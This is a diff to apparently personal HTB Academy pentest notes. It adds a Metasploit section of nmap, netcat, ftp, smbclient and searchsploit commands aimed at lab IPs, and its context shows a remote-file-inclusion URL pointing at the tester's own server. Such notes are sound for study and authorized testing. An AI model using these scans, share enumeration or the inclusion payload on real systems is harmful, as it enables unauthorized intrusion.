@@ -2,6 +2,7 @@
 Lessons and Tutorials Covered
 *
 * Directory Traversal (HTB Academy)> File Inclusion / Directory Traversal
+* Metasploit
 * Nmap
 *
 
@@ -66,10 +67,29 @@ call the file with url http://website.com/index.php?language=http://yourserverip
 *
 
 
+### Metasploit
+
+# install searchsploit
+sudo apt install exploitdb -y
+# scan for services 
+netcat 10.10.10.10 22
+nmap 10.129.42.253
+nmap -sV -sC -p- 10.129.42.253
+nc -nv 10.129.42.253 21
+nmap -sC -sV -p21 10.10.10.121
+#
+ftp -p 10.129.42.253
+nmap -A -p445 10.129.42.253
+smbclient -N -L \\\\10.129.42.253
+smbclient -U bob \\\\10.129.42.253\\users
+# run scan on exploitable components 
+searchsploit openssh 7.2
+msfconsole
 
 
 
 ### Nmap
+netstat -rn
 nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
 nmap -sS -sC -sV -Pn -p- -T4 -A host ip
 nmap -sV --script=smb* host ip
